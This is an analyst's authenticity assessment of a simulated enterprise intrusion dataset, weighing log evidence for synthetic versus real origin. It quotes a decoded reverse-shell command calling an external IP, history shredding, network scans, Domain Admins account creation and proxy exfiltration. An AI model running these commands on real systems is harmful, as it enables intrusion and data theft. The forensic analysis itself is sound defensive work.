# Threat Hunter — Authenticity Assessment
## Verdict
**Assessment:** Synthetic
**Verdict Confidence:** 82
**Synthetic-Confidence Score:** 70

## Executive Summary

This is a high-quality, production-like corpus, but the balance of visible evidence favors synthetic generation. The conclusion is not based on the clean attack story, broad correlation, similar filesystem timestamps, sanitized domains, absent event types, or source thinness. It is driven by three concrete patterns: fleet-wide Linux baseline categories with nearly identical hard caps, an all-or-nothing Sysmon enrichment boundary tied to executable names, and an unexplained Windows NewCredentials token lineage that crosses three unrelated long-running system processes.

The strongest realism evidence is substantial. The six-hour window contains 21 hosts across workstation, server, DMZ, database, mail, proxy, monitoring, and domain-controller roles. It includes 34,620 eCAR records, 31,473 Windows Security/Sysmon events, 20,495 Zeek connection rows, 19,553 ASA lines, 2,697 proxy rows, 720 web-access rows, and 171 Snort alerts. The compromise is pivotable across sources with realistic sensor skew, independent Zeek UIDs, NAT/proxy semantics, byte directionality, process lifecycles, authentication state, and Windows audit companions. All JSON streams and Windows XML files parsed successfully.

No hard contradiction was found. The 70 score therefore means “likely synthetic,” not “confidently synthetic.” A sanitized or selectively collected production export could explain individual anomalies, but it would have to explain all three high-leverage patterns together.

## Evidence For Synthetic

1. **[distribution_texture] Fleet-wide Linux service categories have generator-like fixed quotas.** Of the 11 hosts with `syslog.log`, ten contain exactly eight `dbus-daemon` rows; only `WS-OHADDAD-01` differs, with six. Ten hosts contain exactly five `anacron` rows, with `DB-PROD-01` containing none. The same ten hosts each contain exactly four actual `systemd-resolved` rows; `APP-INT-01` and `PROXY-01` have a fifth textual match only because a `sudo` command mentions `journalctl -u systemd-resolved`. CRON is similarly compressed to 10–12 rows on those ten hosts. The hosts span public web, mail, proxy, file, application, logging, laptops, and workstations, yet category totals are almost invariant while higher-volume role-native services vary substantially. Exact examples include four `systemd-resolved` transitions at `WEB-EXT-01.../syslog.log:26,68,80,98`, four at `FILE-LNX-01.../syslog.log:34,42,44,57`, and four at `MAIL-EDGE-01.../syslog.log:15,48,74,75`. This looks like per-category sampling or deterministic quota generation rather than independent host telemetry.

2. **[schema_or_format] Sysmon enrichment failures follow an executable-catalog boundary.** Across 987 Sysmon Event ID 1 records, 24 (2.43%) have `Hashes=-`. Every one of those same 24 also has all five PE metadata fields set to `-`: `FileVersion`, `Description`, `Product`, `Company`, and `OriginalFileName`. The affected names cluster around uncommon or storyline-specific binaries: four `MonitoringHost.exe`, four AnyConnect `vpnagent.exe`, three `runas.exe`, three Veeam service processes, two `curl.exe`, and one each of `PSEXESVC.exe`, `DeviceSyncSvc.exe`, `DirectoryCacheSvc.exe`, `msra.exe`, `ms-index-service.exe`, an update executable, Thunderbird, and a custom health checker. This is especially implausible for native `C:\Windows\System32\runas.exe` and `curl.exe`: all three runas creations have no hashes or metadata (`WS-MCHEN-01.../windows_event_sysmon.xml:7339-7352`, `7587-7600`, and `7700-7713`), as do both curl creations (`WS-AJOHNSON-01.../windows_event_sysmon.xml:19269-19282` and `19314-19327`). Adjacent native binaries are enriched with SHA1, MD5, SHA256, IMPHASH, and PE metadata. A real global Sysmon hash configuration does not normally divide cleanly by whether an executable appears to be represented in an enrichment catalog.

3. **[contract_gap] NewCredentials token ownership is not operationally explained.** `WS-AJOHNSON-01.../windows_event_security.xml:25558-25594` records a successful Type 9 logon at `2024-03-18T17:00:45.8958339Z`: local target `aisha.johnson`, outbound identity `marcus.chen`, LUID `0x27c991a`, and creator `svchost.exe` PID `0x1104` (4356). The first collection PowerShell is then created under that LUID by a different `svchost.exe`, PID `0x1194` (4500), at `17:00:56.1007199Z` (`windows_event_security.xml:25683-25710`; eCAR line 1252 identifies the parent as NETWORK SERVICE). The same second svchost creates more collection processes at `17:01:10.1490242Z` and `17:16:15.6375606Z` (`windows_event_security.xml:25808-25835` and `27479-27506`). Finally, `services.exe` PID `0x10bc` (4284), not either svchost, directly creates the exfiltration `curl.exe` under the same Type 9 LUID at `17:24:54.0375364Z` (`windows_event_security.xml:28619-28646`; eCAR line 1397). A privileged process can duplicate and transfer tokens, so this is not impossible. However, no visible process-access, remote-thread, service creation, task, runas process, or other mechanism explains transfer of this one token from PID 4356 to PID 4500 and then to PID 4284. The source-native parent, principal, and LUID values therefore do not form a self-contained execution contract.

4. **[weak_signal] A baseline curl process is placed almost exactly on top of exfiltration.** At `17:24:53.2663831Z`, Explorer creates PID 7384 running `curl.exe --proxy http://PROXY-01... "http://10.10.3.20/"` under LUID `0x26fff43` (`WS-AJOHNSON-01.../windows_event_security.xml:28576-28603`). Only 0.771 seconds later, `services.exe` creates PID 7380 with the archive-upload command under `0x27c991a` (`:28619-28646`). Coincidence or deliberate attacker camouflage is possible, so this carries little weight alone; together with the catalog-style missing metadata on both curl processes, it resembles generated background overlap.

5. **[weak_signal] A shredded history file remains as an empty per-user artifact.** `WEB-EXT-01.../ecar.json:3844` records `shred -u /root/.bash_history` at timestamp_ms `1710783591140`, while `WEB-EXT-01.../bash_history/root.bash_history` exists with zero lines. An export pipeline may intentionally materialize an empty file for every known user, so this is not a contradiction. It is only a low-weight sign that artifacts may have been rendered from modeled state rather than collected from a filesystem.

## Evidence For Real

1. **Strong source-native structure and parseability.** All eCAR and Zeek JSON streams parse, and all 20 Windows XML exports parse as complete `<Events>` documents. Windows providers, channels, event versions, task/opcode values, SIDs, LUIDs, process IDs, record IDs, and XML escaping are generally source-appropriate. Zeek records include plausible connection states, histories, packet/byte accounting, `missed_bytes`, service classification, local-origin flags, and independent sensor UIDs.

2. **Realistic sensor timing rather than bit-identical copying.** The initial reverse shell appears in `WEB-EXT-01.../web_access.log:400` at `13:20:30`, in eCAR as Apache-spawned `/bin/bash` at `13:20:30.782` (`ecar.json:777`), in Zeek DMZ at `13:20:34.211055` for `10.10.3.10:53882 -> 45.33.32.30:8443` (`zeek-dmz/conn.json:1499`), and in eCAR flow telemetry at `13:20:34.562` (`ecar.json:779`). The sub-second differences are compatible with distinct observation points.

3. **Plausible intrusion lifecycle.** The web command decodes to a reverse shell to `45.33.32.30:8443`. A later root SSH session on `WEB-EXT-01` is followed by `nmap -sn 10.10.2.0/24` at timestamp_ms `1710769202572` and a five-port TCP scan at `1710769229028`. The resulting burst contains ICMP probes and TCP success, reset, reject, and timeout outcomes across both core and DMZ Zeek sensors. The high `WEB-EXT-01` record count is therefore operationally explained, not merely voluminous.

4. **Windows remote-execution companions are unusually good.** On `DC-01`, Sysmon records `System` writing `C:\Windows\PSEXESVC.exe` at `15:59:36.573`; Security Event 4697 attributes service `PSEXESVC`, `%SystemRoot%\PSEXESVC.exe`, start type 3, and LocalSystem to Aisha's LUID `0x5552f0f` (`windows_event_security.xml:182308-182316`); Event 4688 then records `services.exe -> PSEXESVC.exe -> cmd.exe /c whoami && hostname` (`:182390-182442`). Termination evidence follows. This is a credible service-control lifecycle.

5. **Directory-service and persistence changes have required Windows audit evidence.** eCAR records `net user svc_dirsync ... /add /domain` at timestamp_ms `1710778479338` and Domain Admins membership at `1710778483964` (`DC-01.../ecar.json:3813,3831`). Security events then show SID `...-7021` creation/password/change and membership in Domain Admins SID `...-512` (`windows_event_security.xml:192833-192844`, `192976-192983`, `193012-193024`, and `193137-193146`). At `16:19:30`, `sc.exe create DeviceSyncSvc` and an hourly scheduled task are followed by Event 4697 service fields and Event 4698 task XML (`:198209-198257`, `198393-198476`, and `198551`).

6. **Anti-forensics affect native state correctly.** `DC-01` records Security Event 1102 at `2024-03-18T17:42:34.1403972Z` with `EventRecordID=1` (`windows_event_security.xml:271011-271022`). Subsequent records restart at low IDs; the deletion of `svc_dirsync` at `17:49:44.767` is record 363 (`:277605-277623`). This is a realistic consequence of clearing the Security channel rather than a detached narrative event.

7. **Exfiltration byte and proxy semantics align.** eCAR PID 7380 reads `C:\ProgramData\Microsoft\cache_7f3a.zip` and connects `10.10.1.35:56096 -> 10.10.3.20:8080` (`WS-AJOHNSON-01.../ecar.json:1397,1404,1406`). Proxy rows 2340-2341 preserve that client port and tunnel ID, show a CONNECT then the exact POST URL, and report 18,783,114 client-to-server bytes. Zeek core sees 18,783,458 origin bytes on the client-proxy leg (`zeek-core/conn.json:10750`); Zeek DMZ independently sees that leg and 18,823,540 bytes on `10.10.3.20:35481 -> 45.33.32.30:443` (`zeek-dmz/conn.json:7647,7649`). The different accounting scopes and slight timestamps are realistic.

8. **Environmental roles and background traffic are coherent.** The domain controllers carry Kerberos, LDAP, machine-account, and firewall-platform traffic; mail hosts show Postfix/Dovecot or Windows mail activity; `FILE-LNX-01` shows `smbd`/`smbd_audit`; `APP-INT-01` shows application and SMB integration activity; `PROXY-01` carries explicit proxy traffic; `WEB-EXT-01` receives diverse public web traffic and firewall blocks. Zeek includes DNS, HTTP, TLS, X.509, OCSP, files, SMB, SMTP, DHCP, and PE observations with role-dependent volumes. This is much richer than a storyline-only dataset.

## Detailed Analysis

**Scope and orientation.** The visible eCAR window runs from timestamp_ms `1710763201076` (`2024-03-18 12:00:01.076Z`) through `1710784796912` (`17:59:56.912Z`); Zeek connection coverage runs from `12:00:04.233256Z` through `17:59:52.985780Z`. The address plan is coherent: user endpoints occupy `10.10.1.0/24`; domain, file, mail, application, and monitoring servers occupy `10.10.2.0/24`; DMZ web/proxy systems occupy `10.10.3.0/24`; and `DB-PROD-01` is `10.10.4.10`. Visible users include Aisha Johnson, Marcus Chen, Lina Nguyen, Priya Patel, Diego Ramirez, Omar Haddad, and service/machine identities.

**Signal-to-noise and volume.** The data does not consist only of attack artifacts. eCAR's 34,620 records include 25,560 FLOW CONNECT, 2,284 MODULE LOAD, 2,049 PROCESS CREATE, 1,893 PROCESS TERMINATE, 959 USER_SESSION LOGIN, 505 LOGOUT, 756 PROCESS OPEN, 277 REGISTRY MODIFY, 323 file operations, ten remote-thread events, and three service creations. Zeek core alone contains 11,712 connection rows, 2,969 DNS, 1,723 HTTP, 389 TLS, 651 files, 230 SMB-file, 132 SMB-mapping, 48 DHCP, and 46 SMTP rows. DMZ volume is independently substantial: 8,345 connection, 947 DNS, 1,970 HTTP, 2,228 TLS, and 1,432 file rows. The mix supports normal hunting pivots without relying on complete source matching.

**Initial access and command execution.** The `13:20:30` POST to `/ehr/admin/upload.php` returns HTTP 200/912 bytes from public source `185.70.41.45`. The endpoint then shows `/usr/sbin/apache2` spawning `www-data` bash with a Base64 pipeline. The decoded command is `bash -c "bash -i >& /dev/tcp/45.33.32.30/8443 0>&1"`. The endpoint and Zeek tuple, source port 53882, external address, and TCP state agree. ASA records also show the inbound request and outbound connection/NAT relationship. This chain is operationally feasible.

**Privilege, discovery, and lateral movement.** A workstation SSH client connects to `WEB-EXT-01`, where target-side sshd privilege separation, inbound transport, root login, shell, discovery commands, and two nmap processes follow. The `/24` scans generate roughly 1,500 network observations on each applicable sensor with realistic failures and a small number of live-host successes. Later PsExec-style execution on `DC-01` has the dropped binary, service installation, SCM parent, child command, and termination. WMI-parented commands create and elevate `svc_dirsync`, then create `DeviceSyncSvc` and a scheduled task. The account is later deleted. These are strong indicators of behavioral realism.

**Collection and exfiltration.** On `WS-AJOHNSON-01`, directories and archive creation occur under Type 9 LUID `0x27c991a`; files are staged under `C:\ProgramData\Microsoft\VaultCache`, compressed to `cache_7f3a.zip`, then uploaded through the explicit proxy. The archive's roughly 18.8 MB direction and size remain consistent from endpoint read through proxy tunnel and the two network legs. Separately, `DB-PROD-01` history and eCAR show database inspection, gzip, and SCP of `/tmp/rpt_0318.sql.gz` to `APP-INT-01`; the app host then creates the receiving file and sends it to `FILE-LNX-01` with `smbclient`. Pivot feasibility is excellent.

**Why the verdict remains synthetic.** Correlation quality and narrative completeness are not synthetic indicators by themselves and were not scored as such. The decisive evidence lies outside the story: unrelated Linux hosts repeatedly stop at the same small per-category counts; Sysmon's 24 unenriched process creations split perfectly into five missing metadata fields plus missing hashes and cluster by executable vocabulary; and the key Type 9 LUID moves from a creator in one svchost to children of another svchost and services.exe with no visible ownership-transfer mechanism. Those are independent defects in distribution, source rendering, and operational contracts. Together they outweigh the otherwise excellent realism.

## Realism Score by Category
- **Field format accuracy:** 8 — JSON and XML parse cleanly and most native fields are strong; the all-or-nothing Sysmon metadata/hash gaps prevent a higher score.
- **Temporal patterns:** 8 — Attack and background timing include realistic jitter and sensor skew; repeated fleet-level syslog category caps reduce confidence.
- **Cross-source correlation:** 9 — Endpoint, Zeek, firewall, proxy, web, authentication, and audit companions support high-quality pivots with appropriate accounting differences.
- **Behavioral realism:** 8 — The intrusion and benign role activity are operationally plausible, but the Type 9 token/parent lineage lacks a visible enabling mechanism.
- **Environmental consistency:** 7 — Host roles, subnets, identities, and protocols fit; generic Linux baseline categories are distributed too uniformly across unlike systems.

## Recommendations

1. Acquire the raw EVTX or native event-channel export plus Sysmon configuration for the Windows hosts. Determine whether hashing was configured globally and whether operational errors explain why all 24 hash failures also lose all five metadata fields. Verify the on-disk signatures and versions of `runas.exe` and `curl.exe` in particular.

2. Collect Security, Sysmon, System/Service Control Manager, Task Scheduler, and EDR token/handle telemetry around `WS-AJOHNSON-01` from `17:00:40Z` to `17:25:40Z`. Resolve how LUID `0x27c991a` moved from svchost PID 4356 to PID 4500 and services PID 4284. A real process-access, RPC, service, task, or token-duplication trail would materially lower the synthetic score.

3. Extend raw Linux syslog coverage before and after the six-hour window without category sampling. Compare per-host counts and interarrival distributions for `dbus-daemon`, `anacron`, `systemd-resolved`, and CRON. Persistence of exact 8/5/4-style quotas across windows would be strong confirmation of generation or fixed-category sampling.

4. Preserve packet capture or flow-export provenance for the exfiltration interval. The existing proxy and Zeek accounting is realistic; raw TCP sequence/ACK behavior, retransmissions, TLS fingerprints, and certificate chain timing would provide a harder-to-model discriminator.

5. If the dataset came through a sanitizer or evidence-selection pipeline, document whether it emits empty placeholder history files and applies per-category row caps. Those two collection behaviors could explain the low-weight history artifact and much of the strongest distribution finding without requiring synthetic origin.
